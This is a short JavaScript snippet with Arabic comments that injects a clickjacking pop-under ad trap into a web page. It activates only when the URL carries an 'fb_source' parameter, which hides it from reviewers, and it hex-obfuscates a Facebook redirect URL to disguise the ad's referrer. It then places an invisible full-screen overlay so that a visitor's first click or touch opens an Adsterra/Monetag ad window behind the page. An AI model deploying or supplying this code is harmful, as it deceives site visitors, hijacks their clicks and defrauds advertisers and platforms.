(function() {
    // 1. تحديد "كلمة السر" (البراميتر الذي يجب أن يتواجد في الرابط)
    const secretKey = "fb_source"; 

    // 2. التحقق من وجود البراميتر في الرابط الحالي
    const urlParams = new URLSearchParams(window.location.search);
    if (!urlParams.has(secretKey)) {
        console.log("Clean Session"); // الكود يتوقف هنا تماماً إذا لم يجد البراميتر
        return;
    }

    // --- إذا وجد البراميتر، يبدأ الكود "العبقري" بالعمل ---

    const baseAdUrl = 'https://adsterra-link.com/your-id'; // ضع رابط Adsterra/Monetag هنا
    const _0xref = "\x68\x74\x74\x70\x73\x3a\x2f\x2f\x6c\x2e\x66\x61\x63\x65\x62\x6f\x6f\x6b\x2e\x63\x6f\x6d\x2f\x6c\x2e\x70\x68\x70\x3f\x75\x3d"; 

    const finalAdUrl = baseAdUrl + window.location.search;
    const fullJump = _0xref + encodeURIComponent(finalAdUrl);

    function triggerAd() {
        if (sessionStorage.getItem('_auth_check')) return;

        const win = window.open('', '_blank');
        if (win) {
            win.document.write(`
                <html>
                <head>
                    <meta name="referrer" content="unsafe-url">
                    <script>window.location.replace("${fullJump}");<\/script>
                </head>
                <body style="background:#000;"></body>
                </html>
            `);
            sessionStorage.setItem('_auth_check', 'true');
            win.blur();
            window.focus();
        }
    }

    // تفعيل الفخ فقط للبشر بعد حركات تفاعل
    setTimeout(() => {
        const overlay = document.createElement('div');
        overlay.style.cssText = "position:fixed;top:0;left:0;width:100%;height:100%;z-index:2147483647;background:transparent;cursor:pointer;";
        document.body.appendChild(overlay);

        overlay.onclick = function() {
            triggerAd();
            this.remove();
        };
        overlay.ontouchstart = function() {
            triggerAd();
            this.remove();
        };
    }, 2000); // تأخير ثانيتين لضمان خروج البوتات
})();
